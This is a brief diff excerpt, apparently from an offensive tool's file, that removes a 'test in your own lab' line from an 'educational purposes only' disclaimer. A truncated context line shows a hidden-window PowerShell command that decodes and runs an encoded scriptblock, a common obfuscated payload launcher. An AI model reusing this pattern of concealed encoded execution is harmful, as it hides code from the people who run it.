@@ -77,7 +77,6 @@ powershell /w 1 /C "$a=[scriptblock]::create([Text.Encoding]::Unicode.GetString(
 ###
 DISCLAIMER: THIS IS FOR EDUCATIONAL PURPOSES ONLY! 
 NO LIABILITY FOR ILLEGAL USE IS ASSUMED!
-FEEL FREE TO TEST THIS ON YOUR OWN LAB ENVIRONMENT!
 ###
 © Copyright by LukeProducts
 
